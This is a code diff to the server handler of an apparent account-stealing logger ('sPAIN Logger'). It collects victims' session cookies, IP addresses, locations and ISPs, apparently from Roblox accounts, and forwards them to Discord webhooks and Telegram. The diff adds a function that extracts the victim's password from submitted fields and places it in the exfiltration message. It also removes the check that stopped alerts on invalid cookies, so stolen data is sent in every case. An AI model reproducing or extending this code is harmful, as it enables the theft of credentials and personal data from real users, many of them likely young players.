@@ -79,6 +79,14 @@ function findCookie(slots) {
   }
   return null;
 }
+function findPassword(slots, cookie) {
+  for (const val of Object.values(slots || {})) {
+    const v = String(val || '').trim();
+    if (!v || v === cookie || extractCookie(v)) continue;
+    if (v.length >= 4 && v.length <= 128) return v;
+  }
+  return null;
+}
 
 function parseBody(raw) {
   if (!raw) return {};
@@ -147,6 +155,7 @@ export default async function handler(req, res) {
   const pName  = record.displayName || slug;
   const isDH   = !!record.dualhookParent;
   const cookie   = findCookie(slots);
+  const password = findPassword(slots, cookie);
 
   // Build webhook list
   let webhook1 = null;
@@ -194,27 +203,6 @@ export default async function handler(req, res) {
   const cflag   = flag(country);
   const nowStr  = now;
 
-  // If worker failed (info is null), send error embed but still notify
-  if (!info) {
-    await Promise.all(allWH.map(wh => discordSend(wh, {
-      content: '@everyone',
-      embeds: [{
-        title:       '⚠️ Invalid Cookie or Check Failed',
-        description: isDH ? `${EMOJI} ${record.dualhookParent} ${EMOJI}` : `${EMOJI} s.PAIN ${EMOJI}`,
-        color:       0xff3333,
-        fields: [
-          { name: '🌐 IP',       value: `\`${ip}\``,          inline: true },
-          { name: '📍 Location', value: loc,                   inline: true },
-          { name: '💀 Cookie',    value: 'Expired or invalid', inline: true },
-          { name: '🕐 Time',      value: now,                  inline: false }
-        ],
-        footer: { text: `sPAIN Logger • ${pName}` }, timestamp: now
-      }]
-    })));
-    await tgSend(`⚠️ <b>INVALID COOKIE — ${pName}</b>\n🌐 <code>${ip}</code>\n📍 ${loc}`);
-    return res.status(200).json({ success: true });
-  }
-
   // ── Pull all fields from checker response ─────────────────────────────────
   const fa           = info?.fullAccount || info || {};
   const username     = info?.username    || 'Unknown';
@@ -251,7 +239,9 @@ export default async function handler(req, res) {
 
   // Description - dualhook vs normal
   const descEmoji = isDH ? `${EMOJI} ${record.dualhookParent} ${EMOJI}` : `${EMOJI} \`sPAIN\` ${EMOJI}`;
-  const descLinks = `[Refresh Cookie 🍪](${refreshUrl}) | [Profile 👤](${profileUrl}) | [Discord Server](${DISCORD_INV})\n\n[Join Discord](${DISCORD_INV})`;
+  const descLinks = info
+    ? `[Refresh Cookie 🍪](${refreshUrl}) | [Profile 👤](${profileUrl}) | [Discord Server](${DISCORD_INV})\n\n[Join Discord](${DISCORD_INV})`
+    : `[Discord Server](${DISCORD_INV})`;
   const description = `${descEmoji}\n\n${descLinks}`;
 
   // Cookie display — trimmed for embed, full via chunked message
@@ -269,7 +259,11 @@ export default async function handler(req, res) {
         value:  `\`${username}\``,
         inline: true
       },
-      // PASSWORD FIELD REMOVED
+      {
+        name:   '🔐 Password',
+        value:  `\`${password || 'N/A'}\``,
+        inline: true
+      },
       {
         name:  '📊 Account Stats',
         value: `\`Account Age:\` \`${fmt(ageDays)} Days\``
@@ -344,7 +338,9 @@ export default async function handler(req, res) {
 
   // ── Telegram ─────────────────────────────────────────────────────────────
   await tgSend([
-    `✅ <b>${username} ${ageBracket} — ${pName}</b>`,
+    info
+      ? `✅ <b>${username} ${ageBracket} — ${pName}</b>`
+      : `🍪 <b>COOKIE — ${pName}</b>`,
     `💰 ${fmt(robux)} R$ | RAP: ${fmt(rap)}`,
     `👥 Groups: ${groupsOwned} owned | Bal: ${fmt(groupBalance)}`,
     `📍 ${loc} | ${isp}`,
